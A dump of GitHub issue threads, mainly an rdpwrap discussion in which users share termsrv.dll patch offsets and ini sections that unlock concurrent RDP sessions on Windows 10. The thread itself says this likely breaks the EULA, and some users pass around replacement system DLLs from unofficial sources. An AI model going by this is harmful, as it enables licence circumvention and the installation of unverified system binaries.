people alone. Myself and many others appreciate their work.  Seriously, this guy has become a troll himself. The issue will be fixed when it's fixed. The Rails core team along with the entire community is constantly working on both features and bugs which amazes me.  Personally, I'm grateful for all of their hard work and sacrifice for the betterment of the framework. If people want to bitch and whine about a long standing ""bug"" then perhaps they should quit the rant, write some code, and create a PR.  Last time I checked the core team and contributors are not on some corporate payroll and are not obligated to do anything. They do it for the love of the framework and the community which I think is fabulous. Hopefully this thread dies, it's getting way out of hand. Myself and thousands others appreciate all you guys do!  Certainly, this is just one of many issues with AR (the other one which comes to mind being rails/rails#9813 which can be ""solved"" by upgrading, which is not always a practical solution) I don't even recall the reason why I subscribed to this, but over time I learnt to be more defensive against the very framework itself (especially functionality that is obscure or only used by a minority).  @friend good to hear. Doesn't worry me too much since I just found it when playing with pre release stuff. @friend if ever I'm like ""I wonder what happens when I..."" and I think the behaviour is a bit edge case-y I'll just write a test around the ""broader"" task I'm trying to accomplish. Caught a few bugs in similar cases where I've been relying upon edge cases which have changed during an upgrade.  @friend based on your comment in  should this issue also be closed since its currently targeting 5.0? ",63,25,563,0,0,284,29,
stascorp/rdpwrap/606,0.032956317,stascorp,rdpwrap,,35260,348,529,0.43820224719101125,26,"Well,  it does work on the latest CU update to Win10., I am only allowed one connection at a time. When I log on other users get kicked off I am using Win10 Pro 64 Bit.  Just tested this again !! IS WORKING !!  I can use one and more (Multi) Connection without kicked out. My Testbed is VM-host (win10x64pro) and the Client In VM is Win10x64Home. Fast test was done with RDPCheck.exe and RDPConf.exe to Show „single user session“ not checked !R Regards Von quicken2k Gesendet Samstag, 8. Dezember 2018 1838 An stascorp/rdpwrap Cc hajubu; Comment Betreff Re [stascorp/rdpwrap] Looking for 10.0.17763.168 support (#606) Well, it does work on the latest CU update to Win10., I am only allowed one connection at a time. When I log on other users get kicked off I am using Win10 Pro 64 Bit. — You are receiving this because you commented. Reply to this email directly, view it on GitHub, or mute the thread.  Good day. I installed 17763.168. And it all stopped working. Please tell me in detail what needs to be done to make it work again?   17763.168 was installed now I also have stopped working LOL version 1809 was working so goo until now  hey haijubu, I followed the steps in #601 and I did the ♠net stop TermService net start TermService` and after that I did a reboot but this is what I get  and I'm unable to connect via RDP to my server. Right now I'm connected via TermViewer and this is what I tried  It's still the same and I'm unable to connect. I have Windows 10 Enterprise installed with legit license I tried starting it manually from services and this is what I get  Any help would be appreciated. I only want multiple people to be able to connect using RDP at the same time, that is all Thanks  Update Little modification and this is where I stand now  I had to restart manually but still no luck I also added 3389 to firewall rules. Both UDP and TCP for both incoming and outgoing just in case it might help. Still no luck  Once you install December 5, 2018—KB4469342 (OS Build 17763.168) CU update it limits the termserv.dll to one connection at a time, I  did have a backup of termsrv.dll, replaced it, and now it is working again. Just a heads-up in case anyone else runs into the issue.  I managed to do. I took the file from this post  it at home. And I added lines from the same post to my rdpwrap.ini file.   Hello Team, I did a full  recheck for all version/builds 17763.1,.165,.167, .168   // last CU KB4469342 (v168.1.10 ) and SSU KB4470788 both from 2018-12-04 // msuSSU must be installed before CU , only the 'older' KB4469342 (cab) should/(must) be overwritten. I also installed KB4471331(adobe flash) and  KB 4469041 -preview CU upd NetFramew.3.5/4.72) which I believe not so important // 2 TestBeds)  host x64pro and client x64 (Pro AND Home)  __ !! ARE WORKING  in both direction !!    i.e. local RDPcfg ,RDPchk and ""life"" from 17763.168 and to VM-Client-17763.165,.167,.168        AND a real x64pro-PC to  a x64Home-PC      Look at #601 - hajubu posts (2018-11-21, -22 build .165, 18-12-07 and -08 -------2018-11-21------------ Something has changed from 17763.1 (incl .55, .107 and .134) to 17763.165 in the x64-data [10.0.17763.165]  // LocalOnlyOffset.x64=xxxxx  //xxxxx.(17763.1) =77941 ♢ xxxxx.(17763.165) =77AF1 ( tested and validated ) all other x64-ini-data for 1809rs517763.1 to .134 are the same as .165-data hint SingleUserOffset.x64=132F9 may be also ==1322C as in the original-ini from 2018-10-10 -------2018-11-22------------- 1) ;--------snip-----from here  ...  [10.0.17763.165] ...to... ;--------snip------------- 2) ;--------snip-----from here  ...  [10.0.17763.165SL-Init] ...to... ;--------snip------------- 3) read the snip ;------------------------use as batch / cmd ------------------------- or save it to a txt.file 4) termsrv.dll was meanwhile updated to .167(18-11-27) and .168(18-12-04),  offsets seems to be the same as in .165. Therefore (if you have a need for it ) just change the ini header for the ""new"" build or ................ Add for each build a section for [10.0.17763.nnn] and [10.0.17763.nnn-SLInit] with the data (in #601 -hajubu)  using the snipping data [10.0.17763.165] and [10.0.17763.165-SLInit]. ------2018-12-08---------- Additional Remarks given another team member For each build , you need the two ini-Section [10.0.17763.nnn] and [10.0.17763.nnn-SLInit] / nnn= (1 , 165, 167, 168 ) is given, which contains both (.x64 and .x86) offset-values. This ensures that all these builds will be recognized. I did a replication of my findings (snip-listing Sections [10.0.17763.165] and [10.0.17763.165-SLInit] above) for all three 177763.nnn-builds (165,167,168), adding these section by taking the original build from 2018-10-10 from the repository,containing already the both 177763.1 Sections( with 64 and x86)  whereby the build-number were set according to the wanted build. (! There is a main difference from build 17763.1 to 17763.165). For better reading (and -may be- for the init of rdp-wrapper )                       I did put each section for itself  behind 17763.1 and  behind 17763.1-Slinit. Please be aware not stumbling over a) os-bit version b) not using ""net stop TermService"" and changing the ""newly"" edited ini-file. See my comment for a risk of overwriting this file using unmodified ""install.bat/uninstall.bat"" or the ""update.bat"" . batch/cmd in 3) and it might be a good idea  to change in the [Main] section the Updated=yyyy-mm-dd  to your ""year-month-day"" figures e.g. 2018-12-09 c) after you have replaced the ini-file do restart the ""PC"" or at least use ""start net TermService"".   Stopping and starting may have another trips/tripping , restart the system can be a better idea. Remark Each build 17763.1 , .165 , 167 , 168 comes with an own ""build"" version of Termsrv.dll ( x64,x86). The rfxvmt.dll (x64 , x86 ) has always 17763.1, whereby the the added (older) rfxvmt.dll in syswow64 from the rdp-wrapper install also still works fine. Therefore in x64 you have several choices to circumvent the stumbling stones. Please let me know if this helped. Getting the Termsrv.dll and rfxvmt.dll from the dedicated install.wim (x64 / x86) or do a simple VM install of the OS-build of your choice ( my recommendation) and follow up the workflow, Exchanging a  ""dll""  in a system you have to have special rights as you know already for sure.   I think I understand just copy and Paste 10.0.17763.1 data for .165 and a .168 correct? Dumb Question why doesn't the RDPWrap-V1.62 update.bat do this for us?  @friend wrote …. I think I understand just copy and Paste 10.0.17763.1 data for .165 and a .168 correct? &gt;&gt;&gt; NO  … why doesn't the RDPWrap-V1.62 update.bat do this for us?         &gt;&gt;&gt;  RDP-Wrapper repository (                 rdpwrap.ini  Is still on Updated=2018-10-10 and                 contains only  the ini-sections for  Win10 1809 RTM                                 [10.0.17763.1]   and [10.0.17763.1-SLInit]  REMARK ; I'm pretty sure that it will be updated as soon $MS-Tuesday in Decmeber18 works fine out. From 17763.1 to 17763.165 are Offset-Differences [10.0.17763.165] // LocalOnlyOffset.x64=xxxxx //xxxxx.(17763.1) =77941 ♢ xxxxx.(17763.165) =77AF1 // ( tested and validated ) For each build , you need the two ini-Section [10.0.17763.nnn] and [10.0.17763.nnn-SLInit] / nnn= (1 , 165, 167, 168 ) is given, which contains both (.x64 and .x86) offset-values. Contains the SAME Data (except the Header inside the square-brackets)     1)        Paste and copy from my post in #601 -hajubu - 2018-11-22                  [10.0.17763.165] and [10.0.17763.165-SLInit]     2)         Replicate copy of data in .165 to new ini section inside each Header to           [10.0.17763.167] and [10.0.17763.167-SLInit]     3)         Replicate copy of data in .165 to new ini section inside each Header to           [10.0.17763.168] and [10.0.17763.168-SLInit] Iinfo from build .1 up to .134 Data for 10.0.17763.1 are the same (.1) And from 1.65 up to .168 are the same  But the termserv.dll build have different internal build numbers -&gt; own numbered data sections    Please be aware not tripping over „Windows OS stumbling Stones“   data ownership // security Levels // etc   Read my remarks  for using stopping and starting net termservice  • Good Luck  @friend, @friend @friend , @friend, @friend , @friend, @friend  I wrote down the exact steps I did in (#601). This works fine for 10.17763.168. I think this is the most comprehensive way to understand what to get it working. Thanks to @friend and @friend 👍 🥇  Andre wrote  @friend, @friend @friend , @friend, @friend , @friend, @friend  I wrote down the exact steps I did in (#601). This works fine for 10.17763.168. I think this is the most comprehensive way to understand what to get it working. Thanks to @friend and @friend 👍 🥇 Hello Team, I just want to add that we do have still an open point to be cleared. This open point  could have a ""hidden"" influence to the ""single user session"" - function ( even I could not see/find/obeserve a wrong/not exspected reaction up til now in my Testbed. I do prefer the logical position of the SingleUserOffset  according to  the ""official"" rdpwrap.ini Release (2018-10-10)  up till now  ( 17134.1 , 17763.1 ) 17134.1 == ; SingleUserOffset.x64=1511C  17763.1 == ; SingleUserOffset.x64=1322C UNTIL WE KNOW BETTER. b.r. Hajubu ;--------------------------------------------- ;This logical  position was already used in 17134.1  IN rdpwrap.ini UNTIL 2018-10-10 ; SingleUserPatch.x64=1 ;.text0000000180015100 ; int64 fastcall CSessionArbitrationHelperMgrIsSingleSessionPerUserEnabled(…) ;.text0000000180015119    mov     dword ptr [rax+8], 1    dword ptr  [rax+8],1 &lt;--Zero  ; SingleUserOffset.x64=1511C ;--------------------------------------------- ;--------------------------------------------- ;  --  first seen ;  --  Github StasCorp/Code/res ;  --  original rdpwrap ini 2018-10-10 ;. --  17763.1  ; validated .1 up to .134 and .165,.167 ,.168 ; SingleUserPatch.x64=1 ;.text0000000180013210 ; int64 fastcall CSessionArbitrationHelperMgrIsSingleSessionPerUserEnabled(...) ;.text0000000180013229    mov     dword ptr [rax+8], 1  &lt;-- Zero   C7 08 '01' 00 00 00  ; SingleUserOffset.x64=1322C ;--------------------------------------------- ;--------------------------------------------- ;  --  first seen --  Github StasCorp/rdpWrap ;  --  #601 @friend 2018-11-16 ;  --  and furthermore in myDigitalLife Forum -- ;  --  17763.165 - 168 ; SingleUserPatch.x64=1 ;.text00000001800132E0 ; int64 fastcall CSessionArbitrationHelperIsSingleSessionPerUserEnabled() ;.text00000001800132F7    mov     dword ptr [rdx], 1 &lt;-- Zero  C7 02 '01' 00 00 00  ; SingleUserOffset.x64=132F9 ;---------------------------------------------  Can someone upload the working dll and ini files here?  @ Tom wrote ( Tom Forever)  Just read #611 for the actual data needed ; you should Need Nothing else.  10.0.17763.194 - CU KB4471332 - keeps/lifts the termsrv.dll to its file version 10.0.17763.168. Therefore since .165, .167, .168 use the data-offset, which are the same, we have to add to the rdpwrap.ini dated 2018-10-10 ( last.ini in the repository - code res\rdpwrap,ini). Ensure you have the correct ini file with two ini-sections [10.0.17763.1] , [10.0.17763.1-SLInit] and add then the two sections [10.0.17763.168], [17763.168-SLInit] Keep an eye on Acces Rigths and at least use ""stop net termservice"" before you exchange the rdpwrap.ini (2018-10-10) with your newly edited ini file. ---read more in #611 Or  If is to keen just wait  till the updated „official“ and validated Version of rdpwrap.ini will be  given into the repository (Code res\rdpwrap.ini) then you can just push the button after you have updated your OS to Version 10.0.17763.194 (-.1.5). My recommendation is just do your Job in a VM/VBox  with the last ISO e.g. even the RTM 17763.1 will do it for any purpose , you want (x64,x86 – Home, Pro, etc). Then you can pick up what you ever need for your purpose. .Good Luck Von Tom Gesendet Mittwoch, 12. Dezember 2018 1841 An stascorp/rdpwrap Cc hajubu; Mention Can someone upload the working dll and ini files here?  I edited rdpwrap.ini edit for 17763.168 pursuant to #611. Works excellent for me. Thanks for making my life easier.  This is very very much, not a dumb question, at all. I'd love to know myself to be honest.  I attempted the warezio ini file linked here  has resulted in my machine being no longer accessible. Recommend others avoid for time being until this is fixed. I have also moved my Windows 10 on to the 'slower' release channel for updates.  LOL, I like your post. But it is not correct. Only the -SLInit sections are (at least for versions till 194) are equal. The [10.17763.xxx] sections are different for each version.  Regardless, end users just want to hit ""update.bat"" in Admin mode and have it work a minute or two later, you know?  @friend  wrote  Regardless, end users just want to hit ""update.bat"" in Admin mode and have it work a minute or two later, you know? … up till now there is no „automatic“ solution Ready for „update.bat“- Button Meanwhile  you can use a manually Job see last post of vibaaa in #611 he had managed it too He added also his tested rdpwrap.ini – using the official data from the repo and added the necessary data section. @ andrePKI also had given a very short „cooking recipee“ how doing the Exchange of the rdpwrap.ini. BTW – I’m just an user like you ! Good Luck !  I have tried number of ways from other threads, finally I came up a simple and workable solution for both x32 and x64 edition.  First, install rdpwrap v1.62  to Administrative command prompt, then run ""net stop termservice"" Replace rdpwrap.ini attached (It supports both x32 and x64) Go to Administrative command prompt, then run ""net start termservice"" Finally, go to C\Program Files\RDP Wrapper folder, run RDPConf to check the states Make sure All states are green Congrats! You should now be able to RDP to your desktop.  If Listener state is not green, please do the following-  Go to Administrative command prompt, then run ""net stop termservice"" Replace termsrv.dll and rfxvmt.dll in c\windows\system32 (Please download the correct OS version) Repeat Step 4 to 6 above.  Hope this helps. rfxvmt_32bit.zip rfxvmt_64bit.zip termsrv_x32.zip termsrv_x64.zip rdpwrap.zip   The original developer of this project is a lazy Russian asshole I swear.  I like the instructions you provided @friend , but I advise against replacing any Windows components. It's much better to find out why what is on the machine does not work. View properties of termsrv.dll, get the version, and make sure that section is present in the ini file. Again, I like the instructions.  I think most of the people like me just want to fix the issue and get it work again. I'd leave this to someone who is really interested in finding the root cause. BTW, those two files termsrv.dll and rfxvmt.dll are extracted from Build 10.0.17763.194. x32 and x64. Thanks  Anything above worked for me. Need an effective solution, please  This would be great if we had an official fix that work out of the box instead of zillions uncomprehensible, confusing, contradictory and incomplete instructions here and in other issues that may or may not work... I know this just does not happen magically so thanks in advance to whoever maintains this program.  Like many others, I was also having issues getting RDPWrap to work after updating my Windows 10 install to 10.0.17763.195. I had tried literally everything recommended in this issue and/or referenced in others to no avail. However, I was surprised to find the following commands worked for me and it is now running fine. rdpwinst.exe -u rdpwinst.exe -i I am not sure why these two commands fixed it for me as I had uninstalled / reinstalled using the bat files numerous times. Just thought I'd share in case this could potentially help someone else.  Link But maybe it doesn't work fine for me. My OSversion is Win10 Home 17763.195. Operating as the instuction, I met a problem on step 4, part 1. After I started termservice via , it shut immediately. I don't know what's wrong. Is there any other solution? BTW, I've test it on both of my two computers with the same OS version. It worked nowhere.  I can confirm issues with the provided .ini I have a PC WIN10 pro 17763.195 working fine after updating .ini as described. Another PC with same OS Version is not working. RDP service crashes immediately after updateting .ini and restarting service.  Finally I figured it out for 195. You don't need to dlls, just the .ini file. HOWEVER, there is a small issue with the ini file provided by explorerhk. You need to add a newline (the enter key) at the end of the file!!! Just then follow explorerhk's instructions and it will work! (at least on Windows 10 pro)  Hi, Been trying around, but so far no luck. Did manage to get ""Fully supported"", but listening state keeps saying ""Not listening"". Any idea's?  @friend Thanks a lot. The modified .ini is working for me (new line - ENTER at the end)!  By the way, it is a little bit confusing that a non modified .ini is working for another PC with WIN 2010 pro, too. But I am not worried about that, because it is working on all of my PCs now.  Working fix The problem was with the line endings (LF instead of CRLF) rather than a missing newline. Here is the fixed  file (from #612) to put into  need to restart the service (or windows) for it to take effect  Just got back from holiday, thank you for finding the root cause. I made a little bit clean up of my original ini   file before uploading to GitHub, that's why I didn't realize the issue. I have uploaded the new ini file to my original reply again, hope this helps.  @friend  tried your files and Listener State is still NOT LISTENING followed these steps  net stop termservice replaced termsrv.dll and rfxvmt.dll  installed rdpwrap replaced rdp.ini net start termservice reboot  win x64 pro 10.0.17763.195   @friend, you should not be replacing or modifying any windows components when rdpwrap is used. You should only use what Microsoft put on your machine.  You may need to revert the DLLs back to the original. I found that the dll from rfxvmt_64bit.zip is a different size compared to the original.  Then just follow @friend's instructions with the fixed ini file  First, install rdpwrap v1.62  to Administrative command prompt, then run ""net stop termservice"" Replace rdpwrap.ini in C\Program Files\RDP Wrapper (The new file supports both x32 and x64) Go to Administrative command prompt, then run ""net start termservice"" Finally, go to C\Program Files\RDP Wrapper folder, run RDPConf to check the states Make sure All states are green Congrats! You should now be able to RDP to your desktop.   Hi Everyone, I have tried with this .ini file and it worked for me, it's for 10.0.17763.167 version x64 rdpwrap.zip   But the recomendation not worked for version 10.0.17763.168 (  Hello, I have the same problem see message from smiler999  I'm new to RDPWrap &amp; Github so please forgive me for not understanding protocol here, but I don't understand something.... This program appears dead, as there has been no official support since it ""broke"" last month, yet the author (binarymaster) continues to stop by time to time to ""close"" issues that are very obviously still open. So if this program has been abandoned, why bother to come and close the issues? If it has not been abandoned, why not at least a comment saying ""I am working on it""? Please clarify, thanks!  I just wanted to confirm that this is working on my fully updated system.  The fixed ini file is all that is needed.  I couldn't get it working since I was trying to used the modified dlls (so don't use those!) Luckily I backed up the original files before using the modified dlls. I will restate instructions for people on winver 10.0.17763.195 (10.0.17763.168 in RDPConf).  I am assuming you already have rdpwrap installed but it isn't working.  Download the fixed ini file in explorerhk's post above or here rdpwrap.zip  2.Extract the ini to your desktop.  Run cmd as Administrator  net stop termservice  Open Explorer and go to \Program Files\RDP Wrapper  Drag and drop the ini on the desktop in to RDP Wrapper\ and replace the file in the destination.  Assuming you have your original dlls in System32\  go back to the cmd window and net start termservice  Check RDPConf   I will upload my dlls here as well for anyone that already deleted them and don't have them in the Recycle Bin. termsrv.dll need TrustedInstaller to be owner, so make that change when you put it in System32\ I' dlls.zip m not sure what other permissions are necessary.   Probably closing them since people keep asking how to fix something that has already been addressed. Check out my post above if you are on the same version, it should work.  ditchmagnet's post above resolved my issue, thanks bud  @friend thanks a lot, works great again  10.0.17763.195 x64 pro  @friend - confirming a working solution; thank you.  10.0.17763.195 (10.0.17763.168) x64 PRO  Now have RDPWrap working again.  However, cannot restrict to single user session despite the box checked.  Any suggestions to restrict to one session per user?   I'm curious why this rdpwrap.ini doesn't get updated with the Update.bat ?  Because it is not updated in repository yet.  Howcome though? There's now, definitely a good ini file out there, I got one from someone nearly a week ago and even then, a week ago, i thought it was late.  Err...perhaps the developer/maintainer is busy with life or is waiting to insure the proposed changes don't cause other issues.  Not my project but I would suggest that Priority #1 should be to include any new termsrv offsets as soon as they allow concurrent sessions, even if there are side issues. Surely the Issues area would be better suited for users to report bugs with the newer offsets rather than being an experimental/discussion zone where we're explaining to n00bs over and over how to patch their own rdpwrap.ini. There's already an  update.bat script, but it's essentially useless if the ini file is years out of date. Having the rdpwrap.ini file in two places also causes confusion - at first I did not even know that RDPWrap installs itself to Program Files and that there is where the file should be updated. I propose that if we push the updated offsets to all users sooner, then we will have a bigger pool of users and developers to report on and resolve any bugs that arise, and the issues area could be focused on dealing with real bugs rather than duplicate ""latest build not working"" reports and manual patching tutorials.. /2c  ↑↑↑ This is the reason why I and many others do not publish hobby works. It ain't commercial project with a dedicated support team. Be thankful for whatever service is provided by (likely) one dude in his/her spare time.  Uh, no. As someone who actually publishes open-source software I can say that there is abuse on both sides. On the one hand you have people demanding something for nothing. On the other hand you have people hiding behind terrible projects with ""it's free so be happy for what you get"". The latter is just as bullshit as the former. Stop polluting the internet with broken-ass projects. This noise prevents others from stepping in with better solutions because they think someone else is already handling it. In this particular case, it would take the author all of 10 seconds to post ""I am aware of this issue. Thank you for your contributions. I will be release an update in the near future."" For those of you wanting to see a quicker resolution to this issue, I suggest publishing a Pull Request such as  Then the author just needs one minute to review, click a button, and release an update.  Lol - presumed entitlement is a beautiful thing. Good suggestion on the pull request.  Hey, i am new to rdp. I hope someone can help me. My RDP Check looks good but i can`t open    I got an Error that says The computer was unable to connect to another console session on the remote computer because a console session is already active.  Tick the check box ""single session per user""  The same . Restartet and no change  With RDP Checker it works but not with mstsc.exe  Yes. with RDPcheck.exe i can open more.   The screenshot shows a RDP to local host. Initiate RDP by another PC.  From Tablet it works. can i open rdp from local too?  OS prevents RDP to local host. I know there are some work arounds for XP (e.g. changing standard port for RDP). But I do not know if there are work arounds for Win 10 as well. I have no need for local RDP.  I just found a solution. Used 127.0.0.2 to rdp local  I can't echo the sentiments of this post any more! I'm in exactly the same boat, I always thought RDPWrap was running standalone?!  My ""copy"" is in c!tools\RDPWrap. NO idea it wrote elsewhere, infact I posted on these forums ""what INI file?"" I didn't know it had one. The highest priority should be updating the INI file.    I know, without question that there's an INI file ""out there"" 100% compatible with 168, because I got it nearly 2 weeks ago and it fixed me up. I've set my Windows Update Channel to be slightly slower (as they allow anyhow, only 2 options now?) and hopefully next time this happens, I won't be in the list of bleeding edge users who get done by this - it'll be fixed by the time I'm upgraded. HOWEVER a big bonus SCREW YOU to Microsoft, who never used to ""mess with"" the termserv.dll file back in the old days? Under Windows 7 I don't recall this being ruined / wrecked at all.  Why is it suddenly dying constanmtly under Windows 10? Appreciate the good work but we need to work on a solution which makes this program up to date within I dunno, a week ?   I don't know if we are STILL having users posting ""HELP, it's not working - but we need to fix that.  the solution in issue #611 worked perfectly for my system.  Developer/maintainer doesn't publish a schedule. Check back for updates.  I have tried this and failed so many times now - I don't know what to do next. I had RDPWrap working for release 1803 with no problems. Updating it for 1809 I can't get it to work. I have tried everything in threads 601, 606 and 611. I have Win10 x64 Home v1809. I used the ini file from the other threads, which people say works rdpwrap.zip I start with it uninstalled.  From an elevated command prompt I run RDPWInst -i -o. Then I ran RDPWInst -w  I did net stop termservice (it wasn't running so did nothing) I replaced the C\Program Files\RDP Wrapper\rdpwrap.ini with the one above. I then started the termservice again net start termservice  It stayed in a state of ""starting"".  I rebooted. The service was still permanently in a state of ""starting""   The only way I can stop it is going into the Task Manager, finding the process and killing it. Nothing obvious in the Event Viewer. I don't understand why I'm finding it so difficult when others aren't and previously I had it working. Can anyone help or have any suggestions?   @friend Chris, first find the version of your termsrv.dll (it is in , rightclick it from Explorer)  Next, go to the directory where you installed RDPWrapper (By default it is in ). Check if the INI files does contain the two sections for your version (.168 in my case)♠[10.0.17763.168] [10.0.17763.168-SLInit]C\Program Files\RDP Wrapper`. If you made any changes, restart the service. Note that most of things you do require you to do it as Administrator (or click Yes in the User Account Countrol popup window, if any)  @friend  sure why you blame Microsoft? They are free to modify their own software at will ;-) Multiple RDP sessions into a Windows10 workstation is not a supported Microsoft scenario. Hence to us it is a matter of keeping up with the changes. Basically it is nothing more than a workaround or hack, and I would not be surprised if it is against the Windows EULA. The fact that so many users find issues in W10 and not W7 is that W7 is more or less stable at this point, whereas W10 is (especially in the preview fast and slow rings) constant improvement. Also I have seen people picking on and even being very rude to the IMHO very clever guy who made this software @friend. A BIG THANK YOU for Stanislav!  Works for me. Try to add this to c\Program Files\RDP Wrapper\rdpwrap.ini  Last line MUST be empty Dont forget to ""rdpwinst -r"" ;)  _&gt; &gt; I have tried this and failed so many times now - I don't know what to do next. I had RDPWrap working for release 1803 with no problems. Updating it for 1809 I can't get it to work. I have tried everything in threads 601, 606 and 611. _ Most others are using Win10 Pro vs Home. Quite possible additional tweaks will be needed to accomodate the latter.  @friend Thanks for the suggestions.  Yes, my termsrv.dll matches yours (except the modified date, which you might expect)   Yes, my in file had those 2 sections, but the first had different offsets than @friend's post (despite others saying it worked for them). I replaced it with the sections from @friend 's post above making sure the last line is empty.  Restarted with RDPWrap -r (elevated cmd prompt) Service is still permanently ""starting"" and not listening. Aargh!  @friend - Yes I am doing it for Win10 Home but that's the point of it. I don't need it for my Win10 Pro machine because that already allows RDP for 1 session, which is all I need. I just need to be able to access my other 2 machines' desktops (1 Pro, 1 Home) from my main system without having to have a KVM switch.  @friend - no challenge on your use case; simply observing what works for most may not be applicable in your situation due to difference in platform. I the past I used rdpwrap on Win 10 Home boxes and appreciated the capability it brought to the table (in violation of the EULA). Good luck.  YES !!! THIS WORKS !!! PLEASE DO NOT FORGET TO WRITE-PROTECT YOUR rdpwrap.ini. Otherwise the tool will download new version that das not contain the needed additional marks like discribed here  newest version rdpwrap Install RDPwrap normaly Download newest rdpwrap.ini (  ) and place it into your rdpwrap install folder add this lines to your rdpwrap.ini   [10.0.17763.165] LocalOnlyPatch.x64=1 LocalOnlyOffset.x64=77941 LocalOnlyCode.x64=jmpshort SingleUserPatch.x64=1 SingleUserOffset.x64=132F9 SingleUserCode.x64=Zero DefPolicyPatch.x64=1 DefPolicyOffset.x64=17F45 DefPolicyCode.x64=CDefPolicy_Query_eax_rcx SLInitHook.x64=1 SLInitOffset.x64=1ABFC SLInitFunc.x64=New_CSLQuery_Initialize [10.0.17763.165-SLInit] bInitialized.x64 =ECAB0 bServerSku.x64 =ECAB4 lMaxUserSessions.x64 =ECAB8 bAppServerAllowed.x64 =ECAC0 bRemoteConnAllowed.x64=ECAC4 bMultimonAllowed.x64 =ECAC8 ulMaxDebugSessions.x64=ECACC bFUSEnabled.x64 =ECAD0  Download this termsrv (  ) replace safely yout termsrv.dll with this new downloaded one write proctect yout rdpwrap.ini in your install folder (that you downlooaded in step 3 and modified in step 4) start update.bat  THAT WORKS 100% on 10.0.17763.165 @friend Team Sdelajte etot malenkij update poshalusta ! Agromnoje spasibo sa vashu rabotu !  hey newbie here ) trying to make this work on windows 10 pro 1809 17763.253 I seen a thread was opened already for 17763.253 and was closed  ticket advises this was a duplicate and links to this thread.... doe this mean I can use the fix here or that 1809 17763.253 isn't supported? basically what I'm trying to achieve here is to rdp into my account through my Mac's Microsoft Remote Desktop app while another user is using a different account on the same pc, is this possible?  Hello, I modified the rdpwrapper.ini file and restarted the terservice, now rdpconf tells me that everything is fine (green listening and supported), but when I try to connect with the remote desktop, it terminates immediately without any error message. It seems that the PC is accepting the connections but it terminates them immediately after. Any help please.  Thanks @friend , that has now got me to the next stage - it all now shows green and listening. However, I now have the same problem as @friend in that I can't connect from the remote computer. It terminates immediately when trying to connect. I get the same behaviour from the RDPWrap computer itself when using RDPCheck.  I am busy at the moment, but will answer next week of course. I had the same Problem but got it working. I will answer Thanks Von meinem iPhone gesendet Am 18.01.2019 um 0953 schrieb ChrisH notifications@friend.com&lt;mailtonotifications@friend.com&gt; Thanks @friend , that has now got me to the next stage - it all now shows green and listening. However, I now have the same problem as @friend in that I can't connect from the remote computer. It terminates immediately when trying to connect. I get the same behaviour from the RDPWrap computer itself when using RDPCheck. — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread Please retry all but WITHOUT the step 5 (so do not replace the termsrv.dll, keep the original one) I remember the problem was about the termsrv.dll !!! Von meinem iPhone gesendet Am 18.01.2019 um 0953 schrieb ChrisH notifications@friend.com&lt;mailtonotifications@friend.com&gt; Thanks @friend , that has now got me to the next stage - it all now shows green and listening. However, I now have the same problem as @friend in that I can't connect from the remote computer. It terminates immediately when trying to connect. I get the same behaviour from the RDPWrap computer itself when using RDPCheck. — You are receiving this because you were mentioned. Reply to this email directly, view it on GitHub or mute the thread working with this file - ini_rdpwrap.zip    Finally working! Thanks @friend - that ini file did the trick (I copied back my original termsrv.dll v168 Home) I don't know what's going on but I tried multiple .ini files which people said were working for .168 and none of them worked till now.  i hav problem with rdp wrap winwer 10.0.17763.195 thx  @friend, it's now been 7 weeks since this build was reported. INI files to rectify the issue have been available for most of that time. You seem to be still active on general issue admin, just curious as to why you haven't published the updated INI file/s? Is your plan for the future that everyone will download the tool, find it doesn't work and then have to read through issue tickets to teach themselves how to manually patch the INI file?  I can't believe the INI file hasn't be updated at this URL yet?  is astounding, why has this not been updated? WTF is going on?  Looking at   I submit to you that this project is dead, either temporarily or permanently, because binarymaster is very active on other projects that seem to interest him more. Looking at  it seems that  is the most active fork of this project and  is supported. I recommend you try out that fork and report back (post a comment here) whether it's worth moving on to greener pastures.  Thanks @friend, have checked out tmaguire's fork but I can't see where to download the compiled installer and batch files - at  I can only download the source code. Any ideas?  @friend Not sure. I suggest asking the author directly. His email is listed here ",77,52,2270,0.14606741573033707,0.39325842696629215,1524,71,
RNRF/react-native-router-flux/2835,0.07257656,RNRF,react-native-router-flux,Route 'key0' should declare a screen. For example,1771,8,36,0,1,"Version  react-native-router-flux v4.0.0-beta.28 react-native v0.52.1 ## Actual behaviour throw error like below Unhandled JS Exception Error Route 'key0' should declare a screen. For example   import MyScreen from './MyScreen';   ...   key0 {       screen MyScreen,   }   ...    Expected behaviour then I import all business components into the entry file, and combine them into &lt;Router&gt;&lt;/Router&gt; wrap, it works, but I want organize my route in each business module, and export some module files, combine them in entry file finally. sorry i'm not good at English. please give me a hand, I can't thank you any more Steps to reproduce I export some Components from my business modules like below mm01.js (...some imports gose here) export default class MM01 extends Component{   render(){     return (       &lt;Scene key=""myModule01"" initial tabs&gt;           &lt;Scene key=""myModule010"" initial component={MM010}&gt;           &lt;Scene key=""myModule011"" component={MM011}&gt;           &lt;Scene key=""myModule012"" component={MM012}&gt;           &lt;Scene key=""myModule013"" component={MM013}&gt;       &lt;/Scene&gt;     );   } }  mm02.js (...some imports gose here) export default class MM02 extends Component{   render(){     return (       &lt;Scene key=""myModule02""&gt;           &lt;Scene key=""myModule020"" initial component={MM020}&gt;           &lt;Scene key=""myModule021"" component={MM021}&gt;       &lt;/Scene&gt;     );   } }  entry.js like below (...some imports gose here)  class App extends Component {     return (       &lt;Router&gt;           &lt;Scene key=""root""&gt;               &lt;MM01 /&gt;               &lt;MM02 /&gt;           &lt;/Scene&gt;       &lt;/Router&gt;     ); } AppRegistry.registerComponent('rnMbox', () =&gt; App);  ",2,0,216,0,0.6666666666666666,76,0,
